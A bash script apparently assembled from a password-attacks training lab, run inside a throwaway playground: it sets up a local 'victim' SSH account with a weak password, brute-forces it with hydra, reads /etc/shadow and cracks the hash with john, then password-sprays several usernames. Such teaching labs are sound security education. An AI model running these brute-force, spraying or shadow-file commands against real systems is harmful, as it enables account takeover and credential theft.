#!/usr/bin/env bash
# Lab 7 — Password Attacks: Spraying, Brute Force, Cracking
# Auto-assembled from the lab's command blocks. Review before running.
# Run on the Killercoda Ubuntu Playground: https://killercoda.com/playgrounds/scenario/ubuntu
set -uo pipefail

echo '=== block 1 ==='
apt update && apt install -y hydra john openssh-server

echo '=== block 2 ==='
useradd -m victim
echo 'victim:password123' | chpasswd
systemctl restart ssh

echo '=== block 3 ==='
cat > words.txt <<'EOF'
123456
password
qwerty
letmein
password123
admin
welcome
EOF

echo '=== block 4 ==='
hydra -l victim -P words.txt -t 4 -f ssh://127.0.0.1

echo '=== block 5 ==='
grep "Failed password" /var/log/auth.log 2>/dev/null | tail || journalctl -u ssh --no-pager | grep "Failed password" | tail

echo '=== block 6 ==='
grep victim /etc/shadow > target.hash
john --wordlist=words.txt target.hash
john --show target.hash

echo '=== block 7 ==='
for u in alice bob carol dave eve; do
  hydra -l "$u" -p "Winter2025!" -t 1 -f ssh://127.0.0.1 2>&1 | grep -E "host|valid"
done

